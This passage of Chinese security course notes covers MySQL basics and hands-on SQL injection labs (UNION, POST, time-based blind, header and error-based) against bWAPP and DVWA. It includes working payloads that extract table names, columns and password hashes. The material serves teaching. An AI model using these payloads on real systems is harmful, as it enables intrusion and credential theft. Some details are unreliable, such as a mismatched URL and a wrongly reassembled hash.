- 文件类型检测：白名单 优于 黑名单
- 使用安全的函数进行编程
- 熟悉业务部署环境的OS、Web Server配置 





### MySQL基础

#### 数据库 

- 数据库就是一个存储数据的仓库。
- 数据库是以一定方式储存在一起、能与多个用户共享、具有尽可能小的冗余度、与应用程序彼此独立的数据集合。
- 它的存储空间很大，可以存放百万条、千万条、上亿条数据。 



#### 关系数据库

- 关系型数据库，存储的格式可以直观地反映实体间的关系。关系型数据库和常见的表格比较相似，关系型数据库中表与表之间是有很多复杂的关联关系的。
- 常见的关系型数据库有Mysql，SqlServer等。



#### 非关系型数据库（NoSQL）

- 随着近些年技术方向的不断拓展，大量的NoSql数据库如MongoDB、Redis、Memcache出于简化数据库结构、避免冗余、影响性能的表连接、摒弃复杂分布式的目的被设计。
- NoSQL数据库适合追求速度和可扩展性、业务多变的应用场景。 



#### MySQL 

- MySQL 是最流行的关系型数据库管理系统。
- 在 Web 应用方面 MySQL 是最好的 RDBMS(Relational Database Management System：关系数据库管理系统)应用软件之一。 
- 关系型数据库管理系统
- 瑞典 MySQL AB 公司开发，目前属于 Oracle 公司
- MySQL 是开源的，所以你不需要支付额外的费用
- MySQL 使用标准的 SQL 数据语言形式
- MySQL 可以运行于多个系统上，并且支持多种语言。
- 这些编程语言包括 C、C++、Python、Java、Perl、PHP、Eiffel、Ruby 和 Tcl 等
- MySQL 对PHP有很好的支持，PHP 是目前最流行的 Web 开发语言
- MySQL 是可以定制的，采用了 GPL 协议，你可以修改源码来开发自己的 MySQL 系统。 
- 下载官网：https://dev.mysql.com/downloads/
- 学习MySQL相关文档：https://www.mysqlzh.com/



#### Docker 安装 MySQL

- 查找MySQL的版本：docker search mysql
- 下载mysql的镜像：docker pull mysql:8.0.23
- 查看镜像的名字：docker images
- 启动容器镜像（更改运行的默认端口，并设置密码）：docker run --name mysql-test -itd -p 3307:3307 -e MYSQL_ROOT_PASSWORD=123456 mysql:8.0.23
- 拷贝mysql的配置文件到桌面，docker cp mysql-test:/etc/mysql/my.cnf ./
- 更改配置文件中的端口信息，添加 port=3307
- 重新复制桌面的配置文件到MySQL容器中，docker cp ./my.cnf mysql-test:/etc/mysql/my.cnf
- 重启容器，docker restart mysql-test
- 查看容器启动结果：docker ps
- 使用navicat 连接mysql
  - 用户名 root
  - 密码 123456
  - 端口 3307
- 使用命令行链接mysql
  - docker exec -it mysql-test bash
  - mysql -uroot -p 123456



#### RDBMS术语

- 数据库: 数据库是一些关联表的集合
- 数据表: 表是数据的矩阵。在一个数据库中的表看起来像一个简单的电子表格。
- 列: 一列(数据元素) 包含了相同类型的数据, 例如邮政编码的数据。
- 行：一行（=元组，或记录）是一组相关的数据，例如一条用户订阅的数据。 



#### 对数据库进行操作 

- 显示数据库列表 show databases;
- 进入对应的数据库 use “指定数据库名”;
- 查看所进入数据库的所有表 show tables; 

- 显示数据库版本 select version();
- 查看当前正在使用的数据库 select database();
- 查看使用当前数据库的用户 select user(); 
- 查看数据库路径 select @@datadir;
- 查看安装路径 select @@basedir;
- 查看数据库安装的操作系统 select @@version_compile_os; 



#### 初始数据库

- mysql 安装之后会出现四个数据库
  - information_schema
  - mysql
  - performance_schema
  - sys 



#### information_schema 

- information_schema ，是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。
  - Web渗透过程中用途很大
  - SCHEMATA表：提供了当前MySQL实例中所有数据库的信息。是show databases的结果取之此表。
    - select * from schemata;
    - 上条命令是  show databases; 的超集。
  - TABLES表：提供了关于数据库中的表的信息（包括视图）。
  - COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。
- 测试该信息数据库
  - 创建数据库 test：create database test;
  - 创建数据表 test：create table test (‘id’ int(11), ‘user’ varchar(55));
  - 查看数据表的结构：describe test;
  - SCHEMATA表：select * from information_schema.schemata;
  - TABLES表：select * from information_schema.tables where table_schema='test';
  - COLUMNS表：select * from information_schema.columns where table_name='test'; 



#### mysql

- MySQL的核心数据库，主要负责存储数据库的用户、权限设置、关键字等mysql自己需要使用的控制和管理信息。



#### performance_schema

- 内存数据库，数据放在内存中直接操作的数据库。相对于磁盘，内存的数据读写速度要高出几个数量级，将数据保存在内存中相比从磁盘上访问能够极大地提高应用的性能。 



#### sys

- 通过这个数据库数据库，可以查询谁使用了最多的资源 基于IP或是用户。哪张表被访问过最多等等信息 



#### SQL基础 

- MySQL 数据库使用SQL SELECT语句来查询数据。
  - SELECT column_name,column_name FROM table_name [WHERE Clause] \[LIMIT N][ OFFSET M];
- 插入数据到指定表的语句
  - insert into test values (1, 'test1'), (2, 'test2');
- 如果我们需要修改或更新 MySQL 中的数据，我们可以使用 SQL UPDATE 命令来操作。
  - UPDATE table_name SET field1=new-value1, field2=new-value2 [WHERE Clause];
- 使用 SQL 的 DELETE FROM 命令来删除 MySQL 数据表中的记录
  - DELETE FROM table_name [WHERE Clause] ;
- MySQL LIKE 子句
  - 有时候我们需要获取 runoob_author 字段含有 "COM" 字符的所有记录，这时我们就需要在 WHERE 子句中使用 SQL LIKE 子句。
  - SQL LIKE 子句中使用百分号 %字符来表示任意字符，类似于UNIX或正则表达式中的星号*。
  - 如果没有使用百分号 %, LIKE 子句与等号 = 的效果是一样的。
  - SELECT field1, field2,...fieldN FROM table_name WHERE field1 LIKE condition1 [AND [OR]] filed2 = 'somevalue';
- MySQL UNION 操作符
  - MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中。
  - 多个 SELECT 语句会删除重复的数据。
  - SELECT expression1, expression2, ... expression_n FROM tables [WHERE conditions] UNION [ALL | DISTINCT] SELECT expression1, expression2, ... expression_n FROM tables [WHERE conditions]; 



### GET 注入

#### SQL注入漏洞是什么？

是发生于应用程序与数据库层的安全漏洞。

网站内部直接发送的SQL请求一般不会有危险，但实际情况是很多时候需要结合用户的输入数据动态构造SQL语句，如果用户输入的数据被构造成恶意SQL代码，Web应用又未对动态构造的SQL语句使用的参数进行审查，则会带来意想不到的危险。



#### GET型SQL注入漏洞是什么？

我们在提交网页内容时候，主要分为GET方法，POST方法，GET方法提交的内容会显现在网页URL上，通过对URL连接进行构造，可以获得超出权限的信息内容。 



#### Web 程序三层架构

- 通常意义上就是将整个业务应用划分为
- 界面层 + 业务逻辑层 + 数据访问层
- 用户访问网页实际经过了如下流程

	1. Web浏览器中输入网址并连接到目标服务器；
	2. 业务逻辑层的Web服务器从本地存储加载index.php脚本并解析；
	3. 脚本连接位于数据访问层的DBMS，并执行SQL；
	4. 数据访问层的DBMS返回SQL的执行结果给Web Server；
	5. 业务逻辑层的Web Server将页面封装成HTML格式发送给表示层的浏览器；
	6. 表示层的浏览器解析HTML并将内容呈现给用户。 



#### 注入原理示意

- select id,name from test where id=?
  - ？ 是用户输入，替代为 1 or 1=1
- 实际上执行的SQL语句
  - select id,name from test where id=1 or 1=1
- 也即
  - select id,name from test 



#### SQL注入带来的威胁 

- 猜解后台数据库，盗取网站敏感信息
- 绕过验证登录网站后台
- 借助数据库的存储过程进行提权等操作 



#### GET 注入实战

- 安装，注册，并登录靶机

- 选择bug类型：Choose your bug: SQL Injection (GET/Search)

- 查找注入点 - 尝试输入看看反馈信息 

  - 可能SQL语句 select * from table where name=‘2’
  - 构造SQL语句 select * from table where name=‘2‘’ 

- 查找注入点 – 思考 

  - 为什么要通过输入 ’ 的方式来查找注入点呢？ 
  - 测试test表
    - select * from test where name='test1';  -- 可以执行
    - select * from test where name='test1'';  -- 无法执行，产生错误
  - 从执行结果来看，’ 被直接引入了SQL构造语句，使其产生了错误。 

- 尝试UNION是否生效 - 构造其他SQL语句 

  - 打开HackBar ，在title=e后面添加 'union select 1,2 -- ' 
  - 完整地址为：http://xforburp.com/sqli_1.php?title=e'union select 1,2 -- '&action=search

- 尝试UNION是否生效 – 思考 

  - UNION 语句的作用是什么？
  - SELECT 1,2 的作用是什么？
  - -- 的作用是什么？ 

  ![1617098333173](HackerMeWeb.assets/1617098333173.png)

- UNION生效 – 测试字段数量 - 构造其他SQL语句 

  - 尝试添加更多的数字，在title=e后面添加 'union select 1,2,3,4,5,6,7 -- ' 
  - 完整地址为：http://xforburp.com/sqli_1.php?title=e'union select 1, user(), database(), table_name,version(),6,7 from INFORMATION_SCHEMA.tables where table_schema=database() -- '&action=search
  - 直到展示的数据中出现数字

- 测试字段数量成功 - 替换其中的选项 - 获取数据库详细信息 

  - 在title=e后面添加 'union select 1, user(), database(), table_name,version(),6,7 from INFORMATION_SCHEMA.tables where table_schema=database() -- ' 
  - 完整地址为：http://xforburp.com/sqli_1.php?title=e'union select 1, user(), database(), table_name,version(),6,7 from INFORMATION_SCHEMA.tables where table_schema=database() -- '&action=search
  - 出现数据库的详细信息，看到 users 表
  - 重点：利用 NFORMATION_SCHEMA.tables 表

- 成功获取数据库信息 - 发现users表 - 进行users表结构信息获取 

  - 在title=e后面添加 'union select 1, column_name,2,4,5,6,7 from INFORMATION_SCHEMA.columns where table_name = 'users' -- ' 
  - 完整地址为：http://xforburp.com/sqli_1.php?title=e'union select 1, column_name,3,4,5,6,7 from INFORMATION_SCHEMA.columns where table_name = 'users' -- ' &action=search
  - 重点：利用 NFORMATION_SCHEMA.columns 表

- 已知表信息结构 - 进行表内容信息获取 

  - 在title=e后面添加 'union select 1, login,password,4,5,6,7 from users -- ' 
  - 完整地址为：http://xforburp.com/sqli_1.php?title=e'union select 1, login,password,4,5,6,7 from users -- '  &action=search

- 查询到用户名和密码 – 密码加密了 

  - 6885858486f31043e5839c735d99457f045affd0 
    - 一看就是md5
    - 直接解密
    - 肯定解不开 
  - Len(6885858486f31043e5839c735d99457f045affd0)==40
    - 明显不是md5
    - 至于为啥不是可以百度一下MD5算法，很简单
    - 回到正题，去CMD5解密，得到密码明文 

- 去在线MD5解密网站解密 

  - https://www.cmd5.com/
  - sha1 加密
  - 用户名：A.I.M. 密码 bug
  - 用户名：bee 密码 bug 

- 使用A.I.M账号登录，登录成功



### POST注入 

#### POST型SQL注入漏洞是什么？

- 在HTTP常用方法中，POST方法提交的信息不存储与URL，而是存储在HTTP实体内容中，在大多的提交过程，用户是无感知的。
- 且注入信息是存储于HTTP实体内容中而不是URL，通过改造实体内容，达到实际执行的SQL语句获取更多信息的目的。 



#### POST注入实战

- 安装，注册，并登录靶机

- 选择bug类型：Choose your bug: SQL Injection (POST/Select)

- 查看POST请求 

  - 使用 Burp Suite 进行请求的抓取
  - 查看到请求body的内容：movie=4&action=go

- Send to Repeater 

  - 右键，发送到repeater 进行重放攻击 
  - 进入 Repeater ，重新 Send 尝试不同body

- 构造输入，测试SQL注入点 

  - 当使用 movie=1’&action=go  的时候，会报错

- 使用 union 构造语句获取信息，尝试获取union参数个数 

  - body 的内容为：movie=4 union select 1,2 #&action=go 时候，可以看到内容
  - 继续添加显示的字段数量
  - body 的内容为：movie=4 union select 1,2,3,4,5,6,7 #&action=go 时候，成功显示数据
  - 但是看不到 可以展示的字段是哪个
  - body 的内容为：movie=11 union select 1,2,3,4,5,6,7 #&action=go时候，查询一个不存在的数据就可以展示出来数字对应的字段了

- 使用INFORMATION_SCHEMA.tables， 获取数据库详细信息 

  - body 的内容为：movie=11 union select 1,user(),database(),table_name,version(),6,7 from INFORMATION_SCHEMA.tables where table_schema=database() # &action=go

  - 由于 table 只展示一条数据，无法展示出具体有多少个表

  - 服务端实现

    ![1617101098966](HackerMeWeb.assets/1617101098966.png)

- 通过猜测，进行数据表的模糊匹配

  - body 的内容为：movie=11 union select 1,user(),database(),table_name,version(),6,7 from INFORMATION_SCHEMA.tables where table_schema=database() and table_name like 'user%' # &action=go
  - 可以看到有一个 users 的数据表

- 进行users表结构信息获取 

  - body 的内容为：movie=11 union select 1,column_name,3,4,5,6,7 from INFORMATION_SCHEMA.columns where table_name='users' # &action=go
  - 只可以看到有一个字段是 id

- 进行 用户数据获取

  - 使用 password 进行模糊匹配？





#### 判断SQL注入点 

- 判断注入点时的关键点

  - 判断该访问目标 URL 是否存在 SQL 注入？
  - 如果存在 SQL 注入，那么属于哪种 SQL 注入？
  - TIPS：只要是带有参数的动态网页且此网页访问了数据库，那么就有可能存在 SQL 注入。 

- 判断SQL注入点 – 经典的单引号判断法 

  - http://xxx/test.php?id=1'
  - 如果页面返回错误，则存在 SQL 注入。
  - 原因是无论字符型还是整型都会因为单引号个数不匹配而报错。 

- 判断SQL注入点 – 判断注入类型 

  - 通常SQL注入分为两种：数字型 + 字符型
  - 数字型：
    - 通常语句类型为 select * from <表名> where id = x
    - 我们通常构造and 1=1以及and 1=2来判断
    - select * from test where id=1 and 1=1;
  - 字符型：
    - 通常语句类型为select * from <表名> where id = 'x'
    - 我们通常构造and '1'='1以及and '1'='2来判断 
    - select * from test where name='test1' and '1'='1';

- 判断SQL注入点 – 回归测试 

  - 打开靶机，设置为 SQL Injection (GET/Search)
  - 使用 http://xforburp.com/sqli_1.php?title=d%' and '1'='1'-- &action=search 测试
  - 不添加那个 % ，就无法获得数据
  - 来看一遍源码 ，cd /var/www/html， vim sqli_1.php

  ![1617098333173](HackerMeWeb.assets/1617098333173.png)

  - 可以看到SQL语句的写法是很多的，前面提到的SQL注入判断方式也不是万能药，要根据不同情况灵活调整。
  - 核心是什么？
  - 推测后端SQL语句的形态，尝试闭合SQL语句。 



#### “初级“注入防御方法 

- 减少错误信息反馈 

- 对输入特殊符号进行转义（黑名单） 

  - \$id=mysql_escape_string($id) 
  - 将对id中以下特殊进行转义：
  - \x00 \n \r \  ‘  “  \x1a
  - 如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。 
  - PHP API 进行转义，mysql_escape_string

  ![1617106154979](HackerMeWeb.assets/1617106154979.png)

- 对输入特殊词组进行过滤（黑名单） 

  - 常见的关键字：and、or、union 、select、空格等等过滤 



### 时间盲注 

#### SQL注入的不同类型 

- SQL注入主要分为以下5种
  - Boolean-based blind SQL injection（布尔型注入）
  - UNION query SQL injection（可联合查询注入）
  - Time-based blind SQL injection（基于时间延迟注入）
  - Error-based SQL injection（报错型注入）
  - Stacked queries SQL injection（可多语句查询注入） 

- Boolean-based（布尔型注入）
  - http://test.com/view?id=1 and substring(version(),1,1)=5
  - 如果服务端MySQL版本是5.X的话，那么页面返回的内容就会跟正常请求一样。 
- UNION（联合查询注入）
  - http://test.com/view?id=1 UNION ALL SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA
  - 最快捷的方法，通过UNION查询获取到所有想要的数据，前提是请求返回后能输出SQL执行后查询到的所有内容。 
- Time-based（基于时间延迟注入）
  - select * from user where id= ‘4’ and sleep(3)
  - 页面不会返回错误信息，不会输出UNION注入所查出来的泄露的信息。
  - 类似搜索这类请求，boolean注入也无能为力，因为搜索返回空也属于正常的，这时就得采用time-based的注入了，即判断请求响应的时间，但该类型注入获取信息的速度比较慢，请求次数比较多，纯手工非常复杂。 
- Error-based（报错型注入）
  - 如果页面能够输出SQL报错信息，则可以从报错信息中获得想要的信息。
  - 典型的就是利用group by的duplicate entry错误。 
- Stacked queries（多语句查询型注入）
  - http://test.com/view?id=1;update t set name = ‘a‘ where id=1 
  - 能够执行多条查询语句，非常危险，因为这意味着能够对数据库直接做更新操作。 



#### 时间盲注定义

- 时间盲注是什么？ 
  - 通过注入特定语句，根据对页面请求的物理反馈，来判断是否注入成功，如： 在SQL语句中使用sleep() 函数看加载网页的时间来判断注入点。
  - 适用场景：通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知。 





#### 时间盲注原理 

- 原理示意
  - select * from user where id= ‘ ？’
    - ？ 用户输入，替代为 4’ and sleep(3) -- ‘
  - 实际上执行的SQL语句：
    - select * from user where id= ‘4’ and sleep(3) -- ‘’
  - 当id=4存在时，休眠3秒
  - 当id=4不存在时，直接返回
  - 整条拼接出来的SQL是正确的就执行最后的sleep，前面错误（不存在），sleep(3)不执行。 



#### 时间盲注常用函数

- substr(a,b,c)：从b位置开始，截取字符串a的c长度
- count()：计算总数
- ascii()：返回字符的ASCII码
- length()：返回字符串的长度
- left(a,b)：从左往右截取字符串a的前b个字符
- sleep(n)：将程序挂起n秒
- 还有很多函数可以挖掘，如binary等，同学们理解了盲注的原理后可以到 MySQL官网的Reference去学习。 



#### 时间盲注实战

- 安装，注册，并登录靶机

- 选择bug类型：Choose your bug: SQL Injection - Blind - Time-Based

- 注入尝试

  - 尝试使用错误注入，布尔注入
  - 均无反馈信息（这一点很重要）
  - 尝试其他内容 

- 时间注入 

  - 使用or的方式：http://xforburp.com/sqli_15.php?title=1' or sleep(2) -- &action=search
  - 浏览器一直转圈圈，2秒后获得请求而停止
  - 使用and的方式：http://xforburp.com/sqli_15.php?title=World War Z' and sleep(2) -- &action=search

- 数据库名字长度获取

  - 由于注入点不能反馈信息，所以不能像前面两个注入方式那样直接简洁地获取数据库信息，需要从侧面一步步拼凑信息。 
  - http://xforburp.com/sqli_15.php?title=World War Z' and length(database())=1 and sleep(2) -- &action=search
  - http://xforburp.com/sqli_15.php?title=World War Z' and length(database())>1 and sleep(2) -- &action=search
  - http://xforburp.com/sqli_15.php?title=World War Z' and length(database())>5 and sleep(2) -- &action=search
  - http://xforburp.com/sqli_15.php?title=World War Z' and length(database())>4 and sleep(2) -- &action=search
  - http://xforburp.com/sqli_15.php?title=World War Z' and length(database())=5 and sleep(2) -- &action=search
  - 最终确定数据库名称的长度是5

- 数据库名字的第一个字母获取 

  - http://xforburp.com/sqli_15.php?title=World War Z' and substr(database(),1,1)='a' and sleep(2) -- &action=search
  - http://xforburp.com/sqli_15.php?title=World War Z' and substr(database(),1,1)='b' and sleep(2) -- &action=search
  - 通过一个一个的比对，确定数据库名字第一个字母是什么

- 数据库版本名称长度获取 

  - http://xforburp.com/sqli_15.php?title=World War Z' and length(version())=5 and sleep(2) -- &action=search
  - http://xforburp.com/sqli_15.php?title=World War Z' and length(version())=23 and sleep(2) -- &action=search

- 实际情况

  - 在实际情况中，版本名称不仅只有字母也可能有其他特殊字符，一个一个尝试终究是有遗漏
    的，而且手工输入时间耗时较久，需要通过程序解决。 

- ASCII表 

  ![1617177603495](HackerMeWeb.assets/1617177603495.png)

- 使用ASCII编码的方式测试

  - http://xforburp.com/sqli_15.php?title=World War Z' and ascii(substr(database(),1,1))=98 and sleep(2) -- &action=search

- 自动化程序编写 

  - bWAPP需要登录 ，携带 cookie 信息
  - Python 2.7.9 + 或 Python 3.4+ 以上版本都自带 pip 工具，如无，单独下载后安装 requests 模块。 
  - 程序参见：
    - HackerMeCode\SQLInjectTimeBases\sqlInjection-time_py2.py
    - HackerMeCode\SQLInjectTimeBases\sqlInjection-time_py3.py
    - 通过程序，可以获得数据库的名称

- Requests 模块学习

  - https://github.com/psf/requests
  - https://docs.python-requests.org/en/master/





### HTTP头注入 

#### HTTP头注入是什么

- 针对HTTP的请求头，如果不加以过滤或者转义，在直接与数据库交互的过程中容易被利用进行SQL注入攻击，即HTTP头注入。
- 常见场景：
  - 访问Web Server时，Web Server会从HTTP Header中取出浏览器信
    息、IP地址、HOST信息等存储到数据库中。 



#### HTTP头注入实战

- 安装，注册，并登录靶机

- 选择bug类型：Choose your bug: SQL Injection - Stored (User-Agent)

- 通过Burp Suite抓包拦截请求 

  - 右键 Send to Repeater
  - 在 Repeater 中重新 send ，查看内容

- 推测后端SQL语句的形态，尝试闭合SQL语句。 

  - 更改为：User-Agent: 123
  - 更改为：User-Agent: 123'
  - 更改为：User-Agent: 111','222'); #
  - 更改为：User-Agent: 111', sleep(2)); #

- 猜测后端SQL语句形态：

  - INSERT INTO … VALUES (xxx,yyy);  

- 让我们进入Docker验证一下吧

  - cd /var/www/html/

  - 从浏览器的地址栏可以看到访问的事*17.php

  - vim sqli_17.php

  - 发现下面这段保存数据到数据库的逻辑代码

    ![1617179730172](HackerMeWeb.assets/1617179730172.png)



### 报错注入 

#### 报错注入定义

- 报错注入（Error based Injection）
- 是一种 SQL 注入的类型，用于使 SQL 语句报错的语法，用于注入结果无回显但错误信息有输出的情况。
- 返回的错误信息即是攻击者需要的信息。 



#### 报错注入原理

- 报错注入（Error based Injection）
- MySQL 的报错注入主要是利用 MySQL 的一些逻辑漏洞，如 BigInt 大数溢出等，由此可以将 MySQL 报错注入主要分为以下几类：

1. BigInt 等数据类型溢出；
2. Xpath 语法错误；
3. count() + rand() + group_by() 导致重复；
4. 空间数据类型函数错误。 



#### 报错注入函数

很多函数会导致 MySQL 报错并显示出数据：
1. floor 函数；
2. extractvalue 函数；（最多32字符）
3. updatexml 函数；
4. exp() 函数； 



#### 函数 - rand([N]) 

- rand([N]) - 返回一个随机浮点数 v，范围是 0<=v<1.0
- N 是可选提供的，如果提供了N，则会设定N为一个SEED 
- 测试SQL:
  - select rand() from test;
    - 每一次返回的随机数都是不一样的
  - select rand(0) from information_schema.tables limit 1,10;
    - 每一次返回的随机数都是相同的
  - select rand() from information_schema.tables limit 1,10;
    - 每一次返回的随机数都是不一样的
- 官方解释rand 函数
  - https://dev.mysql.com/doc/refman/8.0/en/mathematical-functions.html#function_rand
  - [`RAND()`](https://dev.mysql.com/doc/refman/8.0/en/mathematical-functions.html#function_rand) in a `WHERE` clause is evaluated for every row (when selecting from one table) or combination of rows (when selecting from a multiple-table join). 



#### 函数 - floor(x) 

- floor(x) - 返回不大于 x 的最大整数 
- 测试SQL:
  - select floor(0.1), floor(0.50), floor(0.99), floor(1.9), floor(2.1);



#### 函数 - count(x) 

- count(x) - 返回 x 数据集的数量 
- 测试SQL:
  - select * from test;
  - select count(*) from test;
  - select count(*) from test where id=1;



#### 函数 - concat(x) 

- 测试SQL:
  - select count(\*),concat((select user()), floor(rand(0)*2)) x from test group by x;
    - 没报错，输出 2 | root@localhost1
  - insert into test values (1, 'test3');  -- 插入重复的 ID 数据
  - select * from test;
  - select count(\*),concat((select user()),floor(rand(0)*2))x from test group by x;
    - 报错了，输出 ERROR 1062 (23000): Duplicate entry 'root@localhost1' for key 'group_key'
- 思考：为什么会触发错误呢？ 
- 继续测试
  - select floor(rand(0)*2) from information_schema.tables limit 1,10;
  - 结合 rand 函数的特性，继续思考函数报错的原因 
    - 在进行 group by 的时候，会出现创建一个虚拟表的操作，使用的主键是 x
    - 查询主键 0，不存在，直接插入
    - 插入时重新计算，主键成为1
    - 查询主键1，存在，直接增加1
    - 查询主键0，主键不存在，直接插入
    - 插入时重新计算，主键成为1，无法插入数值为1的主键（主键1的内容已经存在）
      - 主键插入冲突 --> 报错 
      - Duplicate 



#### 函数 - extractvalue 

- 报错注入 pyload 原理（ EXTRACTVALUE ） 
  - ?id=1' and extractvalue(1, concat(0x7e, (select @@version))) -- ' 
- 测试SQL:
  - select @@version;
  - select extractvalue(1, (select @@version));
    - 报错，ERROR 1105 (HY000): XPATH syntax error: '.43'
  -  select extractvalue(1, concat(0x7e, (select @@version)));
    - 报错，ERROR 1105 (HY000): XPATH syntax error: '~5.6.43'
- 思考：
  1. 为什么要使用 concat 函数呢？
     1. 将报错触发条件，与有价值的数据结合在一起
  2. 0x7e 是什么？ 
     1. 0x7e 是一个 ~，可以保证其无法被执行，而报错



#### 函数 - updatexml 

- 报错注入 payload 原理（ UPDATEXML ） 
  - ?id=2' and updatexml(1,concat(0x7e,(SELECT @@version)),1) -- ' 
- 测试SQL:
  - select updatexml(1,concat(0x7e,(select @@version)),1);
    - 报错，ERROR 1105 (HY000): XPATH syntax error: '~5.6.43'



#### 函数 - exp 

- 报错注入 payload 原理（ exp ） 
  - 注意，exp() 产生错误，但是并没有爆出 database()，但是发现 database() 是表达式，在脚本语言中会转化为相应的值，从而爆出数据库名。 
- 测试SQL:
  - select exp(~(select * from (select database()) x));
    - 报错，ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select `x`.`database()` from (select database() AS `database()`) `x`)))'
  - select * from (select database()) x;
  - select ~(select * from (select database()) x);
    - 输出， 18446744073709551615



#### DVWA 容器安装

- 下载：docker pull registry.cn-shanghai.aliyuncs.com/yhskc/dvwa
- 运行：docker run -d -p 0.0.0.0:81:80 registry.cn-shanghai.aliyuncs.com/yhskc/dvwa
  - 容器内端口为80，映射为主机的81端口
- 测试：
  - http://127.0.0.1:81/
  - 用户名：admin
  - 密码：password





#### 报错注入实战

- 安装，并登录靶机
- 选择bug类型：SQL Injection
- 使用 单引号 测试
  - http://127.0.0.1:81/vulnerabilities/sqli/?id='&Submit=Submit#
  - 报错，You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1
- 使用 extractvalue 函数 进行报错注入
  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,(select @@version))  -- &Submit=Submit#
  - 报错，XPATH syntax error: '.26-MariaDB-0+deb9u1'
- 获取 用户 和 数据库内容
  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, user(), 0x7e, database()))  -- &Submit=Submit#
  - 报错，XPATH syntax error: '\~app@localhost~dvwa'
- 通过information_schema.tables，获取数据表名称
  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, (select table_name from information_schema.tables where table_schema='dvwa' limit 0,1)))  -- &Submit=Submit#
  - 通过更改限制，或者用户表 users
  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, (select table_name from information_schema.tables where table_schema='dvwa' limit 2,1)))  -- &Submit=Submit#
- 通过information_schema.columns，获取用户表字段
  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, (select column_name from information_schema.columns where table_name='users' limit 0,1)))  -- &Submit=Submit#
  - 通过更改限制，或者用户表 的字段 user 与 password
  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, (select column_name from information_schema.columns where table_name='users' limit 3,1)))  -- &Submit=Submit#
  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, (select column_name from information_schema.columns where table_name='users' limit 4,1)))  -- &Submit=Submit#
- 获取用户名和密码
  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, (select user from dvwa.users limit 0,1)))  -- &Submit=Submit#
  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, (select password from dvwa.users limit 0,1)))  -- &Submit=Submit#
  - 问题：密码长度超过32位，导致真正的加密密码只有31位，不全
- Mid() 函数
  - 用于从文本字段中提取字符，自定义长度与起始位置
  - MID( string, start_position, length )
  - link：https://www.techonthenet.com/mysql/functions/mid.php
- 获取真正的密码
  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,mid(concat(0x7e, (select password from dvwa.users limit 0,1)), 1, 29))  -- &Submit=Submit#
    - 获得，XPATH syntax error: '~5f4dcc3b5aa765d61d8327deb882cf9'
  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,mid(concat(0x7e, (select password from dvwa.users limit 0,1)), 29, 29))  -- &Submit=Submit#
    - 获得，XPATH syntax error: 'cf99'
  - 真正的密码为，5f4dcc3b5aa765d61d8327deb882cf9cf99
  - https://www.cmd5.com/ 解密，得到明文密码为 password
- 扩展练习
  - 通过 floor 报错,注入语句如下:
    - select 1 from (select count(\*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a;
  - 通过 exp 报错,注入语句如下:
    - select exp(~(select * from (select user())x)); 



### 堆叠注入 



























